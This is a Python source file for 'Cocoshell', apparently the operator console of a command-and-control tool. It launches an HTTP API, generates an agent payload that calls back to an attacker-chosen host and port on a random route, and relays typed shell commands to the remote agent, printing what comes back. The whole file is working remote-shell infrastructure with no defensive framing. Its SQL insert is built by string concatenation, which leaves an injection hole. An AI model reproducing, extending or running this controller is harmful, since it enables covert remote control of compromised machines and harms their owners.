#!/usr/bin/env python
import subprocess, time, sqlite3, argparse, os, sys, random, string
from os.path import exists
from core.payload import generate
from core.log import Log

parser = argparse.ArgumentParser()
parser.add_argument("-l", "--lhost", help="the ip the agent will connect to")
parser.add_argument("-p", "--lport", help="the port the agent will connect to (default: 5000)")
parser.add_argument("-s", "--sleep", help="the amount of seconds the agent waits for the next command (default: 1)")
parser.add_argument("-r", "--route", help="the api endpoint the agent will connect to")
parser.add_argument("-v", "--verbose", help="debug messages will be printed to the console", action="store_true")
args, leftovers = parser.parse_known_args()

letters = string.ascii_lowercase
route = args.route if args.route is not None else ''.join(random.choice(letters) for i in range(8))

logger = Log(args.verbose)

if args.lhost is not None:
    lhost = args.lhost
else:
    logger.failed("please use -l/--lhost to specify the ip the agent will connect to")
    sys.exit(0)

lport = args.lport if args.lport is not None else '5000'
sleep = args.sleep if args.sleep is not None else 1

logger.debug("Cocoshell API starting")

api_url = 'http://0.0.0.0:' + lport
agent_url = 'http://' + lhost + ':' + lport + '/' + route

try:
    api_log = open("logs/cocoshell_api.log", "a+")
except FileNotFoundError:
    with open("logs/cocoshell_api.log", "a+") as f:
        f.write('')
    api_log = open("logs/cocoshell_api.log", "a+")

proc = subprocess.Popen(["python3", "core/api.py", "-r", route], stdout=api_log)
logger.info(f"Cocoshell API started on {api_url}")
logger.info(f"Agent will connect to {agent_url}")
logger.debug("Connecting to database")
time.sleep(2.0)
con = sqlite3.connect("cocoshell.db", check_same_thread=False)
cur = con.cursor()
logger.debug("Connected")
logger.payload(generate(agent_url, sleep))

waiting_for_result = False
result = None
prompt = "cocoshell> "

#############################################################################

def new_command(cmd):
    if get_last_result()[3] == 1:
        cur.execute("INSERT INTO commands (cmd, result, hasBeenRun) VALUES ('" + cmd + "', null, 0)")
        con.commit()
        logger.debug("Command send to agent")
    else:
        logger.failed("Still waiting for a result")
    return True # Always true as there is either a new command or we are still waiting for a result

def get_last_result():
    cur.execute("SELECT * FROM commands ORDER BY id DESC LIMIT 1")
    return cur.fetchone()

def not_implemented():
    
    logger.failed("This function is currently unavailable but will probably be implemented in the future")

#############################################################################

try:
    while (True):
        command = input(prompt)
        if command == "exit":
            raise SystemExit
        if command == "":
            continue

        waiting_for_result = new_command(command)
        if (command == "help"):
            not_implemented()
            waiting_for_result = False
        if (command == "generate"):
            generate(agent_url)
            waiting_for_result = False
        if (command == "exit-agent"):
            waiting_for_result = False
            logger.warning("Telling the agent to quit")
        if ("set-sleep" in command):
            waiting_for_result = False
            sleep_array = command.split("set-sleep")
            sleep_seconds = sleep_array[1].strip()
            logger.info("Telling the agent to sleep for " + str(sleep_seconds) + " seconds between each request")
            time.sleep(int(sleep))
            sleep = sleep_seconds
            cur.execute("UPDATE commands SET hasBeenRun = 1")

        while (waiting_for_result):
            if get_last_result()[3] == 1:
                waiting_for_result = False
                result = get_last_result()
                if result[2]:
                    logger.debug("Received output from agent")
                    cleaned_result = result[2].replace('%NL%', os.linesep)
                    logger.message(cleaned_result)
                else:
                    logger.failed("No output for that command")
                    logger.failed("The command probably failed")
    
except KeyboardInterrupt:
    print("")
    logger.important("Ctrl+C detected")
    pass
except SystemExit:
    
    logger.debug("Exiting")
    pass
finally:
    
    logger.debug("Cocoshell stopping")
    logger.debug("Cleaning up")
    cur.execute("UPDATE commands SET hasBeenRun = 1")
    con.commit()
    proc.terminate()
    con.close()
    logger.important("Cocoshell stopped")
